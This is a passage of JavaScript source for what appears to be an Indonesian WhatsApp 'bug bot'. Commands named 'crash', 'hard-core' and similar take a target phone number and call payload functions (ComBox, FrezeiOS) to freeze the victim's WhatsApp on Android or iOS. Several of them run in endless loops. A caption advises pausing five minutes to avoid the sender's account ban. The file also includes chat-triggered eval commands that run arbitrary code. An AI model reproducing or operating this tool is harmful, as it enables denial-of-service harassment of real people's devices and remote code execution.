await xxx.sendMessage(target, {text: "𝘞𝘰𝘳𝘬? 𝘺𝘦𝘴𝘴)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝘞𝘰𝘳𝘬? 𝘺𝘦𝘴𝘴",
});
}
replygw("Done clear bug");
}
break



case "pub": {
if (!isBot) return replygw('𝘚𝘰𝘳𝘺 𝘣𝘳𝘰𝘵𝘩𝘦𝘳 𝘩𝘢𝘯𝘺𝘢 𝘶𝘯𝘵𝘶𝘬 𝘰𝘸𝘯𝘦𝘳/𝘣𝘰𝘵')
xxx.public = true
replygw('*Success Changes To Public*');
}
break

case "self": {
if (!isBot) return replygw('𝘚𝘰𝘳𝘺 𝘣𝘳𝘰𝘵𝘩𝘦𝘳 𝘩𝘢𝘯𝘺𝘢 𝘶𝘯𝘵𝘶𝘬 𝘰𝘸𝘯𝘦𝘳/𝘣𝘰𝘵')
xxx.public = false
replygw('*Success Changes To Self*');
}
break

case "addacces": {
if (!isBot) return replygw(`𝘚𝘰𝘳𝘺 𝘣𝘳𝘰𝘵𝘩𝘦𝘳 𝘩𝘢𝘯𝘺𝘢 𝘶𝘯𝘵𝘶𝘬 𝘰𝘸𝘯𝘦𝘳/𝘣𝘰𝘵`)
if (!args[0]) return replygw(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await xxx.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygw(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp !!!`)
kontributor.push(bnnd)
fs.writeFileSync('./message/lib/database/owner.json', JSON.stringify(kontributor))
replygw(`Nomor ${bnnd} Telah Di Acces !!!`);
}
break

case "dellacces": {
if (!isBot) return replygw(`𝘚𝘰𝘳𝘺 𝘣𝘳𝘰𝘵𝘩𝘦𝘳 𝘩𝘢𝘯𝘺𝘢 𝘶𝘯𝘵𝘶𝘬 𝘰𝘸𝘯𝘦𝘳/𝘣𝘰𝘵`)
if (!args[0]) return replygw(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
target = q.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(ya)
kontributor.splice(unp, 1)
fs.writeFileSync('./message/lib/database/owner.json', JSON.stringify(kontributor))
replygw(`Nomor ${target} Telah Di Hapus Acces !!!`);
}
break

case 'crash': {
if (!isAcces) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝘴𝘶𝘤𝘴𝘦𝘴
Target = ${pepec}
Type = Freze Home



*Info*
> jeda 5 menit agar nomor lu gak kenon 😹`
await xxx.sendMessage(from, { video: { url: `https://i.top4top.io/p_3232zzu1w1.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
{
await ComBox(target)
}
}
break

case '𝗂𝗇𝖿𝗂𝗇𝗂𝗍𝗒': {
if (!isAcces) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝘴𝘶𝘤𝘴𝘦𝘴
Target = ${pepec}
Type = Freze Home



*Info*
> jeda 5 menit agar nomor lu gak kenon 😹`
await xxx.sendMessage(from, { video: { url: `https://i.top4top.io/p_3232zzu1w1.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 0; ; i++) {
await ComBox(target)
}
}
break

case 'xeroin-crash': {
if (!isAcces) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝘴𝘶𝘤𝘴𝘦𝘴
Target = ${pepec}
Type = Freze iOS



*Info*
> jeda 5 menit agar nomor lu gak kenon 😹`
await xxx.sendMessage(from, { video: { url: `https://i.top4top.io/p_3232zzu1w1.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
{
await FrezeiOS(target)
}
}
break

case 'hard-core': {
if (!isAcces) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝘴𝘶𝘤𝘴𝘦𝘴
Target = ${pepec}
Type = Freze iOS



*Info*
> jeda 5 menit agar nomor lu gak kenon 😹`
await xxx.sendMessage(from, { video: { url: `https://i.top4top.io/p_3232zzu1w1.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 0; ; i++) {
await FrezeiOS(target)
}
}
break

case 'hard-ui': {
if (!isBot) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴');
await reaction(m.chat, "✅");
for (let i = 0; ; i++) {
await ComBox(m.chat)
}
}
break

case 'System-ui': {
if (!isBot) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
await reaction(m.chat, "✅")
{
await ComBox(m.chat)
}
}
break

case 'hard-system': {
if (!isBot) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴');
await reaction(m.chat, "✅");
for (let i = 0; ; i++) {
await FrezeiOS(m.chat)
}
}
break

case 'xeroin-ui': {
if (!isBot) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
await reaction(m.chat, "✅")
{
await FrezeiOS(m.chat)
}
}
break

case 'poll': {
if (!isBot) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
  "pollCreationMessageV3": {
    "name": "ANJAY",
    "options": [
      {
        "optionName": "VERTC"
      },
      {
        "optionName": "VIRTX"
      }
    ],
    "selectableOptionsCount": 1
  }
}), { userJid: m.chat, quoted: NullNihBos })
xxx.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
replygw('sukses sendbug')
}
break

case 'pair': {
if (!isBot) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
await reaction(m.chat, "✅")
{
await SendPairing(m.chat, Ptcp = true)
}
}
break

case "play": {
if (!isAcces) return replygw('𝘔𝘢𝘢𝘧 𝘢𝘯𝘥𝘢 𝘵𝘪𝘥𝘢𝘬 𝘮𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘢𝘬𝘴𝘦𝘴')
if (!text) return replygw(`*Example:* ${prefix + command} banon cikadap`)
const yts = require('yt-search');
let search = await yts(text);
let telaso = search.all[0].url;
var response = await ytdl(telaso)
var puki = response.data.mp3
xxx.sendMessage(from, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "peler.mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: search.all[0].title,
sourceUrl: search.all[0].timestamp,
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m})
}
break

default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});